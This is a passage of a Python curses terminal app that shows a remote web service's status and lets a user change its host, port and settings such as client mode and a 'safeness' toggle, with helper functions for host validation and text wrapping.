                            nxt = modes[(modes.index(curr) + 1) % len(modes)] if curr in modes else modes[0]
                            self.quick_update_setting("safeness", nxt)
                    elif ch == 27:
                        current_menu = "main"
                else:
                    # Input mode: get string
                    curses.echo()
                    stdscr.addstr(15, 2, f"Enter new {input_mode}: ")
                    stdscr.clrtoeol()
                    value = stdscr.getstr(15, len(f"Enter new {input_mode}: ") + 2, 40).decode().strip()
                    curses.noecho()
                    curses.curs_set(0)
                    if input_mode == 'host':
                        if validate_host(value):
                            self.state.host = value
                            self.flash_message(stdscr, "Host updated.")
                        else:
                            self.flash_message(stdscr, "Invalid host.")
                    else:
                        if value.isdigit() and 1 <= int(value) <= 65535:
                            self.state.port = int(value)
                            self.flash_message(stdscr, "Port updated.")
                        else:
                            self.flash_message(stdscr, "Invalid port.")
                    input_mode = None

    def quick_update_setting(self, key, val):
        st = self.state.status
        # Fetch CSRF
        settings_url = f"{self.state.base_url()}/settings/ui/"
        csrf = _fetch_csrf(self.state.session, settings_url)
        
        payload = {
            "client_mode": st.client_mode or "openldap",
            "safeness": st.safeness or "off",
            "verbosity": "verbose",
            "csrfmiddlewaretoken": csrf
        }
        payload[key] = val
        headers = {"Referer": settings_url}
        try:
            self.state.session.post(f"{self.state.base_url()}/settings/", data=payload, headers=headers, timeout=5)
        except Exception:
            pass
        self.refresh_status()

    def render_header(self, stdscr):
        st = self.state.status
        lines = ASCII_TITLE.strip("\n").splitlines()
        for i, line in enumerate(lines):
            stdscr.addstr(i, 0, line, curses.color_pair(1))
        y = len(lines) + 1
        if st.reachable:
            stdscr.addstr(y, 0, f"Remote: REACHABLE  {self.state.host}:{self.state.port}", curses.color_pair(4))
            stdscr.addstr(y+1, 0, f"Client Mode: {st.client_mode or 'unknown'}  Safeness: {st.safeness or 'unknown'}  Verbosity: {st.verbosity or 'unknown'}")
        else:
            stdscr.addstr(y, 0, f"Remote: UNREACHABLE ({st.error})  {self.state.host}:{self.state.port}", curses.color_pair(3))
        stdscr.addstr(y+2, 0, "-" * 70)

    def render_main_menu(self, stdscr, selection):
        start_y = 12
        for i, item in enumerate(MAIN_MENU):
            disabled = (item == "Show Solutions" and not self.state.status.reachable)
            attr = curses.A_REVERSE if i == selection else curses.A_NORMAL
            if disabled:
                attr |= curses.color_pair(3)
                item_disp = item + " (unavailable)"
            else:
                item_disp = item
            stdscr.addstr(start_y + i, 2, item_disp, attr)

    def render_solutions_menu(self, stdscr, selection):
        start_y = 12
        for i, item in enumerate(SOLUTIONS_MENU):
            attr = curses.A_REVERSE if i == selection else curses.A_NORMAL
            stdscr.addstr(start_y + i, 2, item, attr)

    def render_settings_menu(self, stdscr, selection, input_mode):
        start_y = 12
        options = ["Change host", "Change port", "Change Client Mode", "Change Safeness", "Back"]
        stdscr.addstr(start_y - 2, 2, f"Settings (current {self.state.host}:{self.state.port})", curses.A_BOLD)
        for i, item in enumerate(options):
            attr = curses.A_REVERSE if (selection == i and input_mode is None) else curses.A_NORMAL
            stdscr.addstr(start_y + i, 2, item, attr)
        if input_mode:
            stdscr.addstr(start_y + len(options) + 2, 2, f"Editing {input_mode}...", curses.color_pair(2))

    def flash_message(self, stdscr, msg, delay=1.0):
        h, w = stdscr.getmaxyx()
        stdscr.addstr(h-2, 2, " " * (w - 4))
        stdscr.addstr(h-2, 2, msg[:w-4], curses.color_pair(2))
        stdscr.refresh()
        time.sleep(delay)

    def display_output(self, stdscr, lines: List[str]):
        stdscr.clear()
        self.render_header(stdscr)
        y = 12
        for line in lines:
            for segment in wrap_text(line, 68):
                if y >= curses.LINES - 2:
                    break
                stdscr.addstr(y, 2, segment)
                y += 1
        stdscr.addstr(y+1, 2, "[Enter] to go back...")
        stdscr.refresh()
        while True:
            ch = stdscr.getch()
            if ch in (10, 13, curses.KEY_ENTER):
                break


# ---------------- Utilities ----------------

def validate_host(host: str) -> bool:
    if not host or len(host) > 255:
        return False
    # Allow 'localhost', domain, or IPv4
    if host == "localhost":
        return True
    ipv4 = re.match(r"^\d{1,3}(\.\d{1,3}){3}$", host)
    if ipv4:
        parts = host.split(".")
        return all(0 <= int(p) <= 255 for p in parts)
    # Simple domain name check
    domain = re.match(r"^[A-Za-z0-9.-]+$", host)
    return bool(domain)


def wrap_text(text: str, width: int) -> List[str]:
    words = text.split()
    lines = []
    current = []
    length = 0
    for w in words:
        if length + len(w) + (1 if current else 0) > width:
            lines.append(" ".join(current))
            current = [w]
            length = len(w)
        else:
            current.append(w)
            length += len(w) + (1 if current[:-1] else 0)
    if current:
        lines.append(" ".join(current))
    if not lines:
        lines = [text]
    return lines


def main():
    # Graceful Ctrl+C
    signal.signal(signal.SIGINT, lambda *_: sys.exit(0))
    state = AppState()
    app = MenuApp(state)
    app.run()


if __name__ == "__main__":
    main()
